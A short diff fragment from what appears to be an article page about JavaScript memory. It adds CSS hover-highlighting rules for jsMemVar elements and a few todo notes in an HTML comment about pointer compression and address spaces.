+.jsMem:has(.jsMemVar14:hover) { --jsMemVarB14: var(--jsMemVarB); --jsMemVarF14: var(--jsMemVarF) }
+.jsMem:has(.jsMemVar15:hover) { --jsMemVarB15: var(--jsMemVarB); --jsMemVarF15: var(--jsMemVarF) }
+.jsMem:has(.jsMemVar16:hover) { --jsMemVarB16: var(--jsMemVarB); --jsMemVarF16: var(--jsMemVarF) }
+.jsMem:has(.jsMemVar17:hover) { --jsMemVarB17: var(--jsMemVarB); --jsMemVarF17: var(--jsMemVarF) }
+.jsMem:has(.jsMemVar18:hover) { --jsMemVarB18: var(--jsMemVarB); --jsMemVarF18: var(--jsMemVarF) }
+.jsMem:has(.jsMemVar19:hover) { --jsMemVarB19: var(--jsMemVarB); --jsMemVarF19: var(--jsMemVarF) }
+.jsMem:has(.jsMemVar20:hover) { --jsMemVarB20: var(--jsMemVarB); --jsMemVarF20: var(--jsMemVarF) }
+.jsMem:has(.jsMemVar21:hover) { --jsMemVarB21: var(--jsMemVarB); --jsMemVarF21: var(--jsMemVarF) }
 </style>
 
 <!--
@@ -659,6 +1111,8 @@ other solutions:
 
 todo:
 32bit pointer/memory compression
+make sure we're in 0xa38 address space
+make sure we have mobile addresses available
 
 -->
 [^5]
